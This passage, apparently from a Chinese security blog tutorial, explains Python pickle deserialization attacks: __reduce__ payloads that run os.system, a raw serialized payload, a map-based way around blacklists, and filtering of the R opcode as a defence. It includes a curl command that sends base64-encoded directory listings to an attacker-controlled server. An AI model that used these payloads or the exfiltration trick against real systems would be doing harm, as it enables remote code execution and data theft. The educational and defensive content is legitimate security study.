+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, isMarried</span>):<br>        self.name = name<br>        self.age = age<br>        self.isMarried = isMarried<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&#x27;dir&#x27;</span>,))<br><br><span class="hljs-comment"># 序列化</span><br>payload = pickle.dumps(Person(<span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-literal">False</span>))<br>payload = pickletools.optimize(payload)<br><br><span class="hljs-built_in">print</span>(payload)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;反汇编结果如下：&quot;</span>)<br><span class="hljs-built_in">print</span>(pickletools.dis(payload))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;反序列化&quot;</span>)<br>res = pickle.loads(payload)<br><span class="hljs-built_in">print</span>(res)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240914225108471.png" srcset="/img/loading.gif" lazyload alt="image-20240914225108471"></p>
+<p>结果显示，执行反序列化操作的时候，会顺带执行<code>__reduce__</code>方法中构造的命令。</p>
+<p>在实际的攻击中，目标类的方法可能没有定义有<code>__reduce__</code>方法，那么我们应该如何操作呢？</p>
+<p>我们可以构造带有<code>__reduce__</code>方法（包含目标指令）的序列化格式串，然后作为输入值输入到反序列化函数中让其解析，进行执行恶意命令。</p>
+<p>进行尝试：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, isMarried</span>):<br>        self.name = name<br>        self.age = age<br>        self.isMarried = isMarried<br><br>res = pickle.loads(<span class="hljs-string">b&#x27;\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x8c\x06system\x93\x8c\x03dir\x85R.&#x27;</span>)<br><span class="hljs-built_in">print</span>(res)<br></code></pre></td></tr></table></figure>
+
+<p>payload的值是序列化生成的bites数据。输入payload直接进行反序列化操作，根据结果可以得知能够成功解析并执行了目标指令。</p>
+<p>既然<code>__reduce__</code>方法在反序列化中这么不安全，那么我们可以尝试过滤掉<code>__reduce__</code>。</p>
+<h3 id="过滤-reduce"><a href="#过滤-reduce" class="headerlink" title="过滤__reduce__"></a>过滤<code>__reduce__</code></h3><h4 id="过滤方法"><a href="#过滤方法" class="headerlink" title="过滤方法"></a>过滤方法</h4><ul>
+<li>过滤<code>__reduce__</code>的方式之禁止<code>R</code>操作码</li>
+</ul>
+<blockquote>
+<p>由于<code>__reduce__</code>方法对应的操作码是<code>R</code>，所以只需要把操作码<code>R</code>过滤掉即可。这个效果可以方便地利用<code>pickletools.genops</code>来实现。</p>
+</blockquote>
+<p>实地操作的话，大致操作如下：</p>
+<p>需要注意的是，优化过程可能会将一些不必要的操作码过滤掉。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = pickle.dumps(Person(<span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-literal">False</span>))<br><br>optimize_payload = pickletools.optimize(payload)<br><br>liter = pickletools.genops(payload)<br><br><span class="hljs-keyword">for</span> li <span class="hljs-keyword">in</span> liter:<br>    opcode, arg1, arg2 = li<br>    <span class="hljs-keyword">if</span> opcode.name == <span class="hljs-string">&#x27;R&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(li)<br></code></pre></td></tr></table></figure>
+
+<p><code>genops</code>返回的是一个包含多个成员的元组的迭代器。通过直接打印确认成员的数目，如下，可以确定其是包含了<code>OpcodeInfo</code>对象和两个附加值的元组。<code>OpcodeInfo</code>对象表示pickle操作码的信息，包括操作码（R、GLOBAL等）以及其它附加的参数或数据。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240915134111860.png" srcset="/img/loading.gif" lazyload alt="image-20240915134111860"></p>
+<h4 id="过滤前提下的利用"><a href="#过滤前提下的利用" class="headerlink" title="过滤前提下的利用"></a>过滤前提下的利用</h4><ul>
+<li>过滤<code>__reduce__</code>的方式之不禁止<code>R</code>操作码，但对<code>R</code>执行的函数有黑名单限制</li>
+</ul>
+<p>有一些CTF题目，会给一些有关函数执行的黑名单，比如禁用open、file、os.system、eval、compile等函数。</p>
+<p>我们要如何绕过这种名单限制成功利用这个<code>__reduce__</code>反序列化漏洞呢？</p>
+<p>一方面，尽管有函数执行的黑名单，但是总会有漏网之鱼，但是这种一般是不常见的。</p>
+<p>另一方面，可以利用<code>map</code>来实现。</p>
+<blockquote>
+<p>利用方式：<code>map</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>(<span class="hljs-title class_ inherited__">object</span>):<br> <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>	<span class="hljs-keyword">return</span> <span class="hljs-built_in">map</span>,(os.system,[<span class="hljs-string">&quot;dir&quot;</span>])<br></code></pre></td></tr></table></figure>
+</blockquote>
+<ul>
+<li>过滤<code>__reduce__</code>的方式之彻底过滤了<code>R</code>指令码（只要见到payload里有<code>R</code>这个字符，就直接驳回）</li>
+</ul>
+<blockquote>
+<p>使用场景：给出一个字符串，反序列化之后，name和grade需要与blue module里面的name、grade相对应。</p>
+<p>利用方式：<code>全局变量包含：妙用c指令码</code></p>
+<p>更多操作参考下面的文章:</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势</a></p>
+</blockquote>
+<h3 id="一些细节"><a href="#一些细节" class="headerlink" title="一些细节"></a>一些细节</h3><ul>
+<li>其它模块的load也可以触发pickle反序列化漏洞</li>
+</ul>
+<p>比如, <code>numpy.load()</code>,先尝试以numpy自己的数据格式导入,如果失败,则尝试以pickle的格式导入。但<code>numpy.load()</code>是可以触发pickle反序列化漏洞的。</p>
+<ul>
+<li>即使代码中没有<code>import os</code>，GLOBAL指令也可以自动导入<code>os.system</code></li>
+</ul>
+<p>所以，不能认为没有在代码里导入os库，pickle反序列化的时候就不能执行os.system了。</p>
+<ul>
+<li>即使没有回显，也可以方便地调试恶意代码</li>
+</ul>
+<p>只要拥有一台公网服务器，执行：</p>
+<blockquote>
+<p>os.system(‘curl your_server&#x2F;<code>ls / | base64</code>‘)</p>
+</blockquote>
+<p>然后查询自己的服务器日志，就能看到结果了。原因是：以” &#96; “引号包含的代码，在sh中会直接执行，返回其结果。</p>
+<p>总而言之，对于防守方来说，若想禁用<code>__reduce__</code>这套方法，最稳妥的方法还是禁止<code>R</code>指令操作码。</p>
+<blockquote>
+<p>更多资料：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/tdl320721/article/details/133827636">python实现protobuf序列化与反序列化</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/361349643">pickle反序列化的利用技巧总结</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7436?time__1311=n4+xnD0Dy7GQDt=G=GCDlhjecQhiWeWNHe4D">pickle反序列化初探</a></p>
+</blockquote>
 
                 
               </div>
